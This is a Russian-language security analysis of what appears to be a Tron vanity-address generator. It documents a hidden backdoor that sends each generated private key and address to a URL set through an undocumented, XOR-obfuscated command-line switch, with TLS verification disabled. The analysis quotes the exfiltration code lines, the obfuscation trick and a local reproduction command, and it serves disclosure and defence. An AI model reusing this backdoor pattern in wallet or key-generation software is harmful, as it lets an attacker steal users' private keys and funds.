Краткий вывод: исходный код в данном каталоге **содержит логический путь, позволяющий отправлять “сгенерированный приватный ключ + адрес” на произвольный URL через сеть**, причём это активируется через **скрытые параметры, не указанные в help/README**. Также в сетевом запросе **явно отключена проверка TLS**, что представляет высокий риск. Всё это является прямым доказательством наличия «интерфейса утечки приватного ключа/бэкдора».

---

## 1. Ключевое доказательство: возможность утечки приватного ключа (в открытом виде в URL)

### 1.1 Функция отправки: `postResult(privateKey, address, postUrl)`

Расположение: [`Dispatcher.cpp:L378-L403`]

Ключевые моменты кода:

- Формирование строки запроса с приватным ключом и адресом:
  - `sendData = "privatekey=" + privateKey + "&address=" + address;` [`Dispatcher.cpp:L381`]
  - `sendUrl = postUrl + "?" + sendData;` [`Dispatcher.cpp:L382`]
- Использование libcurl для отправки запроса:
  - `curl_easy_setopt(curl, CURLOPT_URL, sendUrl.c_str());` [`Dispatcher.cpp:L387`]

Это означает: если `postUrl` не пустой, программа может отправить **privatekey и address** как параметры HTTP-запроса.

### 1.2 Момент срабатывания: при каждом совпадении выполняется отправка

Расположение: [`Dispatcher.cpp:L405-L452`]

Ключевые моменты:

- В `printResult(...)` создаются и выводятся:
  - `strPrivate` (приватный ключ) и `strPublicTron` (адрес) [`Dispatcher.cpp:L430-L443`]
- Если `postUrl` не пустой, вызывается `postResult`:
  - `if(!postUrl.empty()) { postResult(strPrivate, strPublicTron, postUrl); }` [`Dispatcher.cpp:L449-L451`]

Также `printResult(...)` вызывается при нахождении результата:

- `printResult(..., m_outputFile, m_postUrl);` [`Dispatcher.cpp:L454-L482`], особенно [`L476`]

Вывод: **если `m_postUrl` задан**, программа автоматически отправляет приватный ключ и адрес при нахождении совпадения.

## 2. Ключевое доказательство: скрытый параметр для задания URL (не указан в документации)

### 2.1 Скрытый параметр замаскирован как `pptt`

Расположение: [`profanity.cpp:L163-L166`]

Ключевые моменты:

- `_s` инициализируется как `{113, 113, 117, 117, 0}` → ASCII `"qquu"`
- Каждый символ XOR с 1: `_s[_k] ^= 1;` [`profanity.cpp:L164`]
- После преобразования: `"pptt"` (`'q'^1='p'`, `'u'^1='t'`)
- Регистрация параметра:
  - `argp.addSwitch('p', _s, __x9);` [`profanity.cpp:L165`]

Таким образом, реальные параметры:

- Короткий: `-p <value>`
- Длинный: `--pptt <value>`

### 2.2 Параметр напрямую передаётся как `postUrl`

Расположение: [`profanity.cpp:L307`]

Ключевой код:

- `Dispatcher d(..., outputFile, __x9);`

Также в `Dispatcher` есть поле:

- `std::string m_postUrl;` [`Dispatcher.hpp:L116-L117`]

Это подтверждает наличие внешнего канала ввода.

### 2.3 Отсутствует в help/README (признак сокрытия)

В `help.hpp` отсутствует `--pptt` и `-p`.

В `README.md` также отсутствует данный параметр.

Вывод: это **скрытый механизм передачи URL, не предназначенный для пользователя**.

## 3. Ключевое доказательство: отключение TLS-проверки

Расположение: [`Dispatcher.cpp:L387-L392`]

Ключевые строки:

- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);`
- `curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);`

Это означает, что даже при использовании HTTPS соединение уязвимо к MITM-атакам.

---

## 4. Воспроизведение (рекомендуется только локально)

Цель: подтвердить утечку приватного ключа

1) Запустить локальный HTTP-сервер с логированием  
2) Запустить программу с параметром:

- `-p http://127.0.0.1:8080/collect`
- или `--pptt http://127.0.0.1:8080/collect`

При нахождении результата будет выполнен запрос:

- `http://127.0.0.1:8080/collect?privatekey=<hex>&address=<base58>`
